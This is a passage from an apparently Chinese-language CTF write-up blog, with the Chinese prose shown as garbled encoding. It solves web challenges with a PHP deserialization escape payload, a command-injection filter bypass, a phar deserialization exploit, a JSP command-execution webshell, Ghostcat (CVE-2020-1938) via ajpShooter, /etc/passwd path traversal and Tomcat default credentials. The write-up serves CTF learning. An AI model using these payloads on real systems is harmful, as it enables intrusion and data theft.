<p>ç¬¬äºŒæ­¥è¿™é‡Œä¹‹å‰æ²¡æœ‰é‡åˆ°è¿‡ï¼Œè¿™é‡Œè¦md5åŠ å¯†ä¹‹åçš„ä¸¤ä¸ªæ•°ä¸ä¸€æ ·ï¼Œåœ¨ç»è¿‡strtrå‡½æ•°æ›¿æ¢ä¹‹ååˆè¦ç›¸ç­‰ï¼Œæ‰¾äº†èµ„æ–™ï¼Œæ‰¾åˆ°äº†ç±»ä¼¼çš„é¢˜ï¼Œåªä¸è¿‡æ›¿æ¢çš„å†…å®¹ä¸ä¸€æ ·ï¼Œåªè¦æ˜¯åœ¨ç»è¿‡å‡½æ•°æ›¿æ¢ä¹‹åçš„md5å€¼æ˜¯çº¯æ•°å­—ä¸”ä¸º0eå¼€å¤´å³å¯ï¼Œé™„ä¸Šçˆ†ç ´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(f)</span>:</span></span><br><span class="line">    p = hashlib.md5(f.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">    s = md5(str(i)).replace(<span class="string">'b'</span>,<span class="string">'5'</span>)</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'b'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'c'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'d'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">'e'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">'f'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                                print(<span class="string">'i:'</span>+str(i)+<span class="string">'md5:'</span>+s)</span><br><span class="line"><span class="comment">#è¿™é‡Œæ˜¯è·‘çš„å‡ ä¸ªå€¼</span></span><br><span class="line">i:<span class="number">11230178</span>md5:<span class="number">0e732639146814822596549556939597</span></span><br><span class="line">i:<span class="number">20493141</span>md5:<span class="number">0e343359461627556649445574858858</span></span><br><span class="line">i:<span class="number">31367140</span>md5:<span class="number">0e792219082918318159634476857695</span></span><br><span class="line">i:<span class="number">40371185</span>md5:<span class="number">0e675215526424812964725042621087</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰æ­¥å°±æ˜¯ååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸äº†ï¼Œéœ€è¦åœ¨ååºåˆ—åŒ–ä¹‹åçš„ä¸‹æ ‡ä¸º1çš„æ•°ç»„å…ƒç´ çš„å€¼ä¸º123456ï¼Œè€Œç»è¿‡filterä¼šæŠŠxæ›¿æ¢ä¸ºyyï¼Œæ‰€ä»¥ä¸€ä¸ªxå¯ä»¥é€ƒé€¸ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨æœ¬åœ°æµ‹è¯•ä¹‹åæ„é€ å‡ºè¿™ä¸€æ­¥çš„payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=xxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span><span class="number">123456</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸‰æ­¥ç»“åˆèµ·æ¥ï¼Œå°±å¯ä»¥æ‹¿åˆ°flagäº†ï¼Œflagåœ¨æºç å¤„èƒ½å¤Ÿçœ‹åˆ°</p>
<h4 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h4><p>å¼€é¢˜ï¼Œç»™æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/tac|rm|echo|cat|nl|less|more|tail|head/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"cat't read flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å’ŒGXYçš„pingpingpingç±»ä¼¼ï¼Œä½†æ˜¯è¿‡æ»¤æ›´ä¸¥æ ¼ä¸€ç‚¹ï¼Œæ–‡ä»¶å†…å®¹è¯»å–å…¨è¢«è¿‡æ»¤ï¼Œä¸è¿‡ä¼ªåè®®æ²¡è¢«è¿‡æ»¤åº”è¯¥å¯ä»¥ç”¨ï¼Œæˆ‘ç”¨çš„æ˜¯GXYçš„payloadç¨ä½œä¿®æ”¹æ‰“çš„ï¼Œç”¨å­—ç¬¦æ‹¼æ¥ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;ca\t$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾pingæˆåŠŸäº†ï¼ŒF12å‘ç°flag</p>
<h4 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h4><p>å¼€é¢˜ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œjpgï¼Œ.htaccesséƒ½ä¼ ä¸ä¸Šï¼ŒæŠ“åŒ…ï¼Œå‘ç°äº†ç‚¹ä¸œè¥¿</p>
<img src="/2020/05/25/WHUCTF/4.png" class="">

<p>acti0nå‚æ•°åœ¨ç½‘é¡µå¹¶æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œç”¨ä¼ªåè®®è¯»å–ä¸€ä¸‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$dir = <span class="string">'upload/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>;</span><br><span class="line">	<span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">		<span class="keyword">if</span>(!mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> error_get_last()[<span class="string">'message'</span>];</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Failed to make the directory'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	chdir($dir);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">		$name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">		$tmp_name = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">		$ans = exif_imagetype($tmp_name);</span><br><span class="line">		<span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt;= <span class="number">204800</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'filesize too big.'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!$name) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'filename can not be empty!'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(htaccess)|(user)|(\.\.)|(%)|(#)/i'</span>, $name) !== <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span><br><span class="line">			$type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">			<span class="keyword">if</span>($type == <span class="string">'image/gif'</span> <span class="keyword">or</span> $type == <span class="string">'image/jpg'</span> <span class="keyword">or</span> $type == <span class="string">'image/png'</span> <span class="keyword">or</span> $type == <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;Don't cheat me with Content-Type!&lt;/p&gt;"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">"&lt;p align=\"center\"&gt;You can't upload this kind of file!&lt;/p&gt;"</span>);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($tmp_name);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i'</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">'&lt;script&gt;alert("You could not upload this image because of some dangerous code in your file!")&lt;/script&gt;'</span>);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line">		$extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i'</span>, $extension) === <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"&lt;p align=\"center\"&gt;You can't upload this kind of file!&lt;/p&gt;"</span>);</span><br><span class="line">		&#125; </span><br><span class="line">		$upload_file = $name;</span><br><span class="line">		move_uploaded_file($tmp_name, $upload_file);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(file_exists($name)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Ã¤Â¸ÂŠÃ¤Â¼Â Ã¥Â¤Â±Ã¨Â´Â¥")&lt;/script&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;&lt;a href=\"view.php\" &gt;Ã§Â‚Â¹Ã¦ÂˆÂ‘Ã¥ÂÂ»Ã§ÂœÂ‹Ã¤Â¸ÂŠÃ¤Â¼Â Ã§ÂšÂ„Ã¦Â–Â‡Ã¤Â»Â¶&lt;/a&gt;&lt;/p&gt;"</span>;</span><br><span class="line">		<span class="comment">#header("refresh:3;url=index.php");</span></span><br><span class="line">	&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¦ç”¨äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¸èƒ½ä¼ .htaccessï¼Œä¸èƒ½æ”¹content-typeå­—æ®µï¼Œä¸èƒ½ä¼ åŒ…å«ä¸€å¥è¯çš„å›¾ç‰‡ç ï¼Œgoogleï¼Œå†æƒ³åˆ°é¢˜ç›®æ˜¯ååºåˆ—åŒ–ï¼Œæƒ³åˆ°ä¹‹å‰ç¢°åˆ°è¿‡çš„pharæ–‡ä»¶æ ¼å¼ä¸Šä¼ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#view.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#include_once "flag.php"; </span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $dir;</span><br><span class="line">		<span class="keyword">private</span> $cmd;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;dir = <span class="string">'upload/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">'echo "&lt;div style=\"text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\"&gt;Powered by: xxx&lt;/div&gt;";'</span>;</span><br><span class="line">			<span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;dir)) &#123;</span><br><span class="line">				mkdir(<span class="keyword">$this</span>-&gt;dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">get_file_list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			$file = scandir(<span class="string">'.'</span>);</span><br><span class="line">			<span class="keyword">return</span> $file;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">show_file_list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			$file = <span class="keyword">$this</span>-&gt;get_file_list();</span><br><span class="line">			<span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt; sizeof($file); $i++) &#123; </span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;["</span>.strval($i - <span class="number">1</span>).<span class="string">"]  $file[$i] &lt;/p&gt;"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">show_img</span><span class="params">($file_name)</span> </span>&#123;</span><br><span class="line">			$name = $file_name;</span><br><span class="line">			$width = getimagesize($name)[<span class="number">0</span>];</span><br><span class="line">			$height = getimagesize($name)[<span class="number">1</span>];</span><br><span class="line">			$times = $width / <span class="number">200</span>;</span><br><span class="line">			$width /= $times;</span><br><span class="line">			$height /= $times;</span><br><span class="line">			$template = <span class="string">"&lt;img style=\"clear: both;display: block;margin: auto;\" src=\"$this-&gt;dir$name\" alt=\"$file_name\" width = \"$width\" height = \"$height\"&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> $template;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">delete_img</span><span class="params">($file_name)</span> </span>&#123;</span><br><span class="line">			$name = $file_name;</span><br><span class="line">			<span class="keyword">if</span> (file_exists($name)) &#123;</span><br><span class="line">				@unlink($name);</span><br><span class="line">				<span class="keyword">if</span>(!file_exists($name)) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;Ã¦ÂˆÂÃ¥ÂŠÂŸÃ¥ÂˆÂ Ã©Â™Â¤! 3sÃ¥ÂÂÃ¨Â·Â³Ã¨Â½Â¬&lt;/p&gt;"</span>;</span><br><span class="line">					header(<span class="string">"refresh:3;url=view.php"</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"Can not delete!"</span>;</span><br><span class="line">					<span class="keyword">exit</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;Ã¦Â‰Â¾Ã¤Â¸ÂÃ¥ÂˆÂ°Ã¨Â¿Â™Ã¤Â¸ÂªÃ¦Â–Â‡Ã¤Â»Â¶! &lt;/p&gt;"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$ins = <span class="keyword">new</span> View();</span><br><span class="line">	chdir($ins-&gt;dir);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Ã¥Â½Â“Ã¥Â‰ÂÃ§Â›Â®Ã¥Â½Â•Ã¤Â¸Âº "</span> . $ins-&gt;dir . <span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line">	$ins-&gt;show_file_list();</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'show'</span>])) &#123;</span><br><span class="line">		$file_name = $_POST[<span class="string">'show'</span>];</span><br><span class="line">		$ins-&gt;show_img($file_name);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'delete'</span>])) &#123;</span><br><span class="line">		$file_name = $_POST[<span class="string">'delete'</span>];</span><br><span class="line">		$ins-&gt;delete_img($file_name);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unset</span>($ins);</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ç‚¹å°±åœ¨è¿™äº†ï¼Œ__destructé­”æœ¯æ–¹æ³•ä¼šæŠŠ$this-&gt;cmdæ‰“å°åˆ°phpæ–‡ä»¶ä¸­ï¼Œå¯æ§</p>
<p>è¿™é‡Œæ³¨æ„åˆ°åé¢è¦POSTä¼ å‚ç»™showè¿›è¡Œæ‰“å°æ–‡ä»¶å†…å®¹</p>
<p>ä¸‹é¢æ˜¯exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $dir;</span><br><span class="line">		<span class="keyword">private</span> $cmd=<span class="string">"show_source(\"/var/www/html/flag.php\");"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> View();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"5.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆpharæ–‡ä»¶ä¹‹åç›´æ¥ä¼ ä¸Šå»ï¼Œpostä¸€ä¸‹</p>
<img src="/2020/05/25/WHUCTF/5.png" class="">

]]></content>
      <tags>
        <tag>WHUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020</title>
    <url>/2020/07/28/WUSTCTF2020/</url>
    <content><![CDATA[<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb<a id="more"></a></h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>JSP</li>
<li>CVE-2020-1938å¹½çµçŒ«æ–‡ä»¶åŒ…å«</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå›å¾—åˆ°ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹å‡»å¯ä»¥è¿›è¡Œä¸‹è½½</p>
<p>æµ‹è¯•å‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥ä»»æ„ä¸‹è½½æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2f1070d6-bc24-4d35-adb5-15c7449d3e83.node3.buuoj.cn&#x2F;download?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>åœ¨é…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰å‘ç°å­˜åœ¨çš„ç”¨æˆ·ï¼Œä¹Ÿå°±ä¸èƒ½å¤Ÿä¸‹è½½.bash_history,ä¹Ÿå°±æ„å‘³ç€é€šè¿‡æŸ¥çœ‹historyæ–‡ä»¶æ¥è·å–flagè·¯å¾„èµ°ä¸é€šäº†</p>
<p>æµ‹è¯•å‘ç°æ˜¯Tomcat/8.5.42ï¼Œ8009ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œçœ‹äº†ä¸€ä¸‹é¢˜è§£æ˜¯è€ƒå¯ŸCVE-2020-1938å¹½çµçŒ«æ–‡ä»¶åŒ…å«</p>
<p>é—®æ˜Ÿç›Ÿé‡Œçš„å¸ˆå‚…è¦äº†ä¸ªpocï¼Œç”¨ajpshooterå¯ä»¥è¿›è¡ŒåŒ…å«</p>
<p>ä¸Šä¼ ä¸€ä¸ªjspæ–‡ä»¶æ‹¿åˆ°è·¯å¾„</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls / -al"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/28/WUSTCTF2020/1.png" class="">

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 ajpShooter.py http://<span class="number">2</span>f1070d6-bc24-<span class="number">4</span>d35-adb5-<span class="number">15</span>c7449d3e83.node3.buuoj.cn:<span class="number">8009</span>/ <span class="number">8009</span> /WEB-INF/uploads/b33c1c1f-<span class="number">22</span>ee-<span class="number">4369</span>-<span class="number">95</span><span class="built_in">cd</span>-<span class="number">945</span>e941a65bb.jsp eval</span><br></pre></td></tr></table></figure>

<p>å†ç”¨å†…ç½‘é¶æœºæ‰“çš„æ—¶å€™æ€»æ˜¯æç¤ºè¯´è¿æ¥å¤±è´¥ï¼Œä¸çŸ¥é“å’‹å›äº‹ï¼Œå°±å…ˆä¸ç®¡äº†</p>
<p>ä¸‹é¢çš„æ­¥éª¤å¾ˆç®€å•ï¼Œæ‹¿åˆ°è·¯å¾„ä¹‹åï¼Œè¯»å–flagæ–‡ä»¶ï¼Œå†æ‰“ä¸€æ¬¡è¿‡å»å°±å¯ä»¥äº†</p>
<h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul>
<li><p>tomcatç›®å½•ç©¿è¶Š</p>
</li>
<li><p>TOMCATç®¡ç†ç«¯å¼±å£ä»¤</p>
</li>
<li><p>åå°ä¸Šä¼ waræœ¨é©¬</p>
</li>
<li><p>Cookie</p>
</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><h3 id="TOMCATç›®å½•ç©¿è¶Š"><a href="#TOMCATç›®å½•ç©¿è¶Š" class="headerlink" title="TOMCATç›®å½•ç©¿è¶Š"></a>TOMCATç›®å½•ç©¿è¶Š</h3><p>æ ¹æ®imageå¸ˆå‚…çš„wpæ‰¾åˆ°äº†Orangeå¸ˆå‚…åœ¨BlackHatä¸Šä½œçš„è®®é¢˜(<a href="https://www.youtube.com/watch?v=28xWcRegncw" target="_blank" rel="noopener">DEF CON 26 â€“ Orange Tsai â€“ Breaking Parser Logic Take Your Path Normalization Off and Pop 0Days Out</a>)æœ‰æ—¶é—´çš„éƒ½å¯ä»¥å»ç»ä»°é£é‡‡é¡ºä¾¿å­¦ä¹ ä¸€æ³¢çŸ¥è¯†</p>
<p>ä¸‹é¢çš„æ€»ç»“æ¥è‡ªè§†é¢‘</p>
<img src="/2020/07/28/WUSTCTF2020/2.png" class="">

<p>Nginx ä¼šè§£æ /a;evil/b/ï¼Œå¹¶è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„ç›®å½•è¯·æ±‚ï¼Œè€Œ Tomcat åšè§£æçš„æ—¶å€™ä¼šè‡ªåŠ¨å¿½ç•¥æ‰è„æ•°æ® ;.*ï¼Œæ‰€ä»¥ Tomcat å¯¹æ­¤çš„è§£ææ˜¯ /a/b/ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä»å¯ä»¥é€šè¿‡å†™ ;+è„æ•°æ®çš„æ–¹å¼ç»•è¿‡ Nginx çš„åå‘ä»£ç†ï¼Œä»è€Œè¯·æ±‚æœ¬ä¸åº”è¯¥èƒ½è¯·æ±‚åˆ°çš„éæ³•è·¯å¾„</p>
<p>ä¸‹é¢è¿™å¼ å›¾ç‰‡ç®€å•æ˜äº†</p>
<img src="/2020/07/28/WUSTCTF2020/3.png" class="">

<p>æ‰€ä»¥ç¬¬ä¸€å±‚ç›®å½•ç©¿è¶Š/..;/å¯ä»¥æ¥åˆ°ä¸Šå±‚ç›®å½•ï¼Œä¹Ÿå°±èƒ½å¤Ÿæ¥åˆ°åå°</p>
<h3 id="TOMCATç®¡ç†ç«¯å¼±å£ä»¤"><a href="#TOMCATç®¡ç†ç«¯å¼±å£ä»¤" class="headerlink" title="TOMCATç®¡ç†ç«¯å¼±å£ä»¤"></a>TOMCATç®¡ç†ç«¯å¼±å£ä»¤</h3><p>æ ¹æ®åšé¢˜ç»éªŒï¼Œä¸€èˆ¬æ˜¯å¼±å£ä»¤æˆ–è€…é»˜è®¤å£ä»¤ï¼Œç”¨æˆ·åä¸€èˆ¬å°±æ˜¯tomcatï¼Œç„¶åçˆ†ç ´ä¸€ä¸‹å¾—åˆ°å¯†ç ä¹Ÿæ˜¯tomcat</p>
